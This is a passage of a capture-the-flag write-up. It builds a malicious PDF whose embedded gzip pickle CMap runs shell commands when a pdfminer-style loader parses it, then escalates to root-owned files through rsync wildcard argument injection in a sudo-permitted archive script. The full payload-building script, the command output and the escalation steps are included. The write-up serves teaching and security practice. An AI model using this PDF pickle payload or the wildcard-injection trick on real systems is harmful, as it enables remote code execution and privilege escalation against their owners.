(__import__('os').system('id'), {'CODE2CID': {}, 'IS_VERTICAL': False, ...})[1]
```

It relies on tuple-expression evaluation order:

```python
(a, b)[1]
```

Evaluate `a`, then `b`, and select the second element, `b`.

The resulting sequence is:

```python
__import__('os').system('id')
```

Execute the command, then return:

```python
{
    "CODE2CID": {},
    "IS_VERTICAL": False,
    "CID2UNICHR_H": {},
    "CID2UNICHR_V": {},
}
```

This both executes the command and returns a value shaped like the CMap data the loader expects.

`gzip.compress(...)` supplies the compression layer matching the loader's `.pickle.gz` format.

### make_pdf.py

The PDF-building script from the challenge solution:

```python
#!/usr/bin/env python3

#读取make_pickle.py生成的test.pickle.gz，构造内嵌它的恶意PDF
with open("test.pickle.gz", "rb") as f:
    pickle_gz = f.read()

#页面绘制命令，必须真的用/F1画一次字，否则pdfminer不会加载这个字体
content = b"BT /F1 12 Tf 72 720 Td <0001> Tj ET"

objects = [
    #Catalog，声明本PDF有内嵌文件
    b"<< /Type /Catalog /Pages 2 0 R /Names << /EmbeddedFiles 8 0 R >> >>",

    #页面树
    b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",

    #页面，资源里声明/F1字体
    b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
    b"/Resources << /Font << /F1 4 0 R >> >> /Contents 7 0 R >>",

    #利用1: Type0字体，/Encoding是攻击者可控的CMap名
    b"<< /Type /Font /Subtype /Type0 /BaseFont /TestFont "
    b"/Encoding /test /DescendantFonts [5 0 R] >>",

    #正常的CIDFont和FontDescriptor，让字体结构合法
    b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /TestFont "
    b"/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >> "
    b"/FontDescriptor 6 0 R /DW 1000 >>",

    b"<< /Type /FontDescriptor /FontName /TestFont /Flags 4 "
    b"/FontBBox [0 -200 1000 900] /ItalicAngle 0 "
    b"/Ascent 800 /Descent -200 /CapHeight 700 /StemV 80 >>",

    #页面内容流
    b"<< /Length " + str(len(content)).encode() + b" >>\nstream\n" + content + b"\nendstream",

    #利用2: 附件名称表，把文件名映射到9号对象
    b"<< /Names [(test.pickle.gz) 9 0 R] >>",

    #Filespec，相当于附件的"目录项"，/EF指向真正的数据流
    b"<< /Type /Filespec /F (test.pickle.gz) /UF (test.pickle.gz) "
    b"/EF << /F 10 0 R >> >>",

    #EmbeddedFile流，pickle.gz的原始字节
    b"<< /Type /EmbeddedFile /Length " + str(len(pickle_gz)).encode() +
    b" >>\nstream\n" + pickle_gz + b"\nendstream",
]

#拼接完整PDF: 文件头 + 对象们 + xref交叉引用表 + trailer
out = b"%PDF-1.4\n"
offsets = []
for i, obj in enumerate(objects, 1):
    offsets.append(len(out))
    out += f"{i} 0 obj\n".encode() + obj + b"\nendobj\n"

xref_pos = len(out)
out += f"xref\n0 {len(objects) + 1}\n".encode()
out += b"0000000000 65535 f \n"
for off in offsets:
    out += f"{off:010d} 00000 n \n".encode()

out += b"trailer\n"
out += f"<< /Size {len(objects) + 1} /Root 1 0 R >>\n".encode()
out += b"startxref\n" + str(xref_pos).encode() + b"\n%%EOF\n"

with open("test.pdf", "wb") as f:
    f.write(out)

print("test.pdf written")
```

## RCE

Uploading the PDF carrying `ls /` already returns output; I do not need an additional traversal step in this instance:

```json
{"job":"5ddccd19987f43c18dc5e1dc22b5e3ab","returncode":0,"stderr":"","stdout":"app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n{\"embedded\":[\"test.pickle.gz\"],\"encodings\":[\"test\"],\"loaded\":[\"test\"],\"missing\":[],\"pages\":1}\n"}
```

`id` shows `uid=1000(app)`, an unprivileged application account.

```json
{"job":"9f013ffb658645ec812b70e4ef18fbdd","returncode":0,"stderr":"","stdout":"uid=1000(app) gid=1000(app) groups=1000(app)\n{\"embedded\":[\"test.pickle.gz\"],\"encodings\":[\"test\"],\"loaded\":[\"test\"],\"missing\":[],\"pages\":1}\n"}
```

I first look for the flag anyway. `find / -iname "*flag*"` returns ordinary system files and failed payload artifacts, plus two interesting paths: `/app/data/stage/flag` and `/opt/pdf-archive/flag`. Reading the first is denied:

```json
{"job":"47b1637b3a994a9b8b5ff5811f6f2a6f","returncode":0,"stderr":"cat: /app/data/stage/flag: Permission denied\n","stdout":"{\"embedded\":[\"test.pickle.gz\"],\"encodings\":[\"test\"],\"loaded\":[\"test\"],\"missing\":[],\"pages\":1}\n"}
```

The second is readable:

```json
{"job":"9acca34247584a2898b71f8dbbfafb6f","returncode":0,"stderr":"","stdout":"flag{legacy_cmap_pickle_to_root_archive_sync}\n{\"embedded\":[\"test.pickle.gz\"],\"encodings\":[\"test\"],\"loaded\":[\"test\"],\"missing\":[],\"pages\":1}\n"}
```

The flag:

```text
flag{legacy_cmap_pickle_to_root_archive_sync}
```

## Understanding root_archive_sync

Curious about `root_archive_sync` in the flag, I inspect `/app/data/stage/`:

```text
-rw-r--r-- 1 app app 0 --chmod=ugo+r
-rw-r--r-- 1 app app 0 --copy-links
-rw-r--r-- 1 app app 0 --ignore-times
lrwxrwxrwx flag -> /root/flag
lrwxrwxrwx hostprobe -> /etc/hostname
```

`/app/data/stage/flag` is a symlink to `/root/flag`, explaining the denied read. The directory also contains three unusual filenames: `--copy-links`, `--chmod=ugo+r`, and `--ignore-times`.

There is also an archive-sync script under `/app/scripts/`:

```bash
#!/bin/sh
set -eu
cd /app/data/stage
/usr/bin/rsync -a * /opt/pdf-archive/
```

This appears to be the intended privilege-escalation stage. It is **wildcard argument injection**: the shell expands `*`, and rsync interprets filenames beginning with `--` as options. The command effectively becomes:

```bash
rsync -a --chmod=ugo+r --copy-links --ignore-times flag hostprobe /opt/pdf-archive/
```

- `--copy-links`: follow symlinks and copy the **target contents**, here `/root/flag`.
- `--chmod=ugo+r`: make the transferred destination file readable by all users.
- `--ignore-times`: do not skip transfers merely because the usual size/time checks match.

The job copies `flag` and `hostprobe` into `/opt/pdf-archive/`, leaving `/opt/pdf-archive/flag` readable.

I later learned that this stage was meant to be completed manually. The shared challenge container already held a previous solver's artifacts, explaining the unexpected files. The intended sequence was:

1. `sudo -l` shows `(root) NOPASSWD: /usr/local/bin/archive-sync`, identifying the permitted passwordless root command.
2. `cat /usr/local/bin/archive-sync` reveals the rsync wildcard argument-injection opportunity.
3. `cd /app/data/stage && touch ./--copy-links ./--chmod=ugo+r ./--ignore-times && ln -sf /root/flag ./flag && sudo /usr/local/bin/archive-sync` creates the three option-like files and a `./flag` symlink to `/root/flag`, then runs the authorized challenge archive job as root.
4. `cat /opt/pdf-archive/flag` reads the copied flag after the privileged job has transferred it.

A few Linux-command notes from this challenge:

`sudo`：

`sudo` runs a permitted command **as another user, root by default**. Policy is commonly configured in `/etc/sudoers` and `/etc/sudoers.d/`, allowing specific commands without granting an unrestricted root shell.
`sudo -l` lists the current user's applicable sudo permissions without running the listed privileged commands. `sudo -ln` requests this non-interactively.

| Command | May prompt for a password? | Suitable context |
| --- | --- | --- |
| `sudo -l` | Yes | Interactive inspection |
| `sudo -ln` | No | Scripts or other non-interactive contexts |

`touch`：

```bash
touch a.txt        # a.txt不存在 → 创建空文件; 已存在 → 只更新mtime
#注意
touch --copy-links      # ✗ 报错: touch: 无法识别的选项 "--copy-links"
#解法，同时：-- 是POSIX约定的选项终止符，防御 rsync -a * 类漏洞的写法 rsync -a -- * /dest/ 用的就是它
touch ./--copy-links    # ① 加路径前缀, 名字不再以--开头
touch -- --copy-links   # ② 用 -- 显式告诉命令"后面都是参数不是选项"
```

`ln`：

```bash
ln 目标 硬链接名       # 硬链接
ln -s 目标 软链接名    # 软链接（符号链接, symbolic link）
#关于 -f（force）
ln -s target.txt mylink     # ✗ mylink已存在 → File exists (exit=1)
ln -sf target.txt mylink    # ✓ 先删旧的再建, 幂等
```

| | Hard link | Symbolic link (`-s`) |
| --- | --- | --- |
| Nature | Another name for the same file/inode | A special file containing a target path |
| Missing target | Normally cannot be created | Can exist as a dangling symlink |
| Across filesystems | No | Yes |
| Link to a directory | Generally prohibited for ordinary use | Yes |
| After removing the target name | File remains accessible through the hard link | The symlink dangles if its target path no longer resolves |
| `ls -l` display | Ordinary file with an increased link count | A link entry showing `name -> target` |

## Flag

```text
flag{legacy_cmap_pickle_to_root_archive_sync}
```
